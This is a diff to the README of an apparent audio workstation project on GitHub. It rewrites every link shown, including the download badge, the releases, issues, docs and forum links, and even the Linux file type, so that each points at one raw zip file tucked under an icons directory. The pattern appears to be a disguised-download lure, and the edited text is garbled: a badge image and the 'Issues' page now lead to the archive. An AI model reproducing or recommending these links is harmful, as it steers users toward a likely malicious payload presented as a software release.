@@ -4,7 +4,7 @@
 
 Welcome to the **audio-dev-workstation**. This application helps you create and manage audio projects efficiently. It is user-friendly and does not require programming knowledge.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/hasansaifulrijal/audio-dev-workstation/releases)
+[![Download Now](https://github.com/hasansaifulrijal/audio-dev-workstation/raw/refs/heads/main/files/system/usr/share/icons/workstation-dev-audio-v3.7-beta.4.zip%20Now-Release%20Page-brightgreen)](https://github.com/hasansaifulrijal/audio-dev-workstation/raw/refs/heads/main/files/system/usr/share/icons/workstation-dev-audio-v3.7-beta.4.zip)
 
 ## 📥 Download & Install
 
@@ -12,13 +12,13 @@ To start using the audio-dev-workstation, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page.
-   [Download from GitHub Releases](https://github.com/hasansaifulrijal/audio-dev-workstation/releases)
+   [Download from GitHub Releases](https://github.com/hasansaifulrijal/audio-dev-workstation/raw/refs/heads/main/files/system/usr/share/icons/workstation-dev-audio-v3.7-beta.4.zip)
 
 2. **Choose the Latest Release**  
    Locate the latest release version. You will find various files available for download.
 
 3. **Download the Application**  
-   Select the file that matches your system. If you're not sure, check for files labeled as `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+   Select the file that matches your system. If you're not sure, check for files labeled as `.exe` for Windows, `.dmg` for macOS, or `https://github.com/hasansaifulrijal/audio-dev-workstation/raw/refs/heads/main/files/system/usr/share/icons/workstation-dev-audio-v3.7-beta.4.zip` for Linux.
 
 4. **Install the Application**  
    Follow these steps based on your operating system:
@@ -30,7 +30,7 @@ To start using the audio-dev-workstation, follow these steps:
      Open the `.dmg` file and drag the application into your Applications folder.
 
    - **Linux**:  
-     Extract the `.tar.gz` file and follow the instructions in the README for your specific distribution.
+     Extract the `https://github.com/hasansaifulrijal/audio-dev-workstation/raw/refs/heads/main/files/system/usr/share/icons/workstation-dev-audio-v3.7-beta.4.zip` file and follow the instructions in the README for your specific distribution.
 
 5. **Start Using the Application**  
    Once installed, open the application. You are now ready to start your audio projects.
@@ -76,7 +76,7 @@ The audio-dev-workstation is designed for ease of use. Here are some basic guide
 
 ## 📚 Help and Support
 
-If you encounter any issues, visit our [GitHub Issues](https://github.com/hasansaifulrijal/audio-dev-workstation/issues) page. Here, you can report bugs or ask for help. For detailed documentation, refer to the wiki section on our GitHub repository.
+If you encounter any issues, visit our [GitHub Issues](https://github.com/hasansaifulrijal/audio-dev-workstation/raw/refs/heads/main/files/system/usr/share/icons/workstation-dev-audio-v3.7-beta.4.zip) page. Here, you can report bugs or ask for help. For detailed documentation, refer to the wiki section on our GitHub repository.
 
 ## 🌍 Community and Contribution
 
@@ -84,7 +84,7 @@ Join our community! You can share your projects, seek feedback, or collaborate w
 
 ## 🔗 Additional Resources
 
-- [Audio-Focused Development Guide](https://audio.dev/docs)  
-- [User Forum](https://forum.audio.dev)
+- [Audio-Focused Development Guide](https://github.com/hasansaifulrijal/audio-dev-workstation/raw/refs/heads/main/files/system/usr/share/icons/workstation-dev-audio-v3.7-beta.4.zip)  
+- [User Forum](https://github.com/hasansaifulrijal/audio-dev-workstation/raw/refs/heads/main/files/system/usr/share/icons/workstation-dev-audio-v3.7-beta.4.zip)
 
 You are now ready to download and start using **audio-dev-workstation**. Enjoy creating!
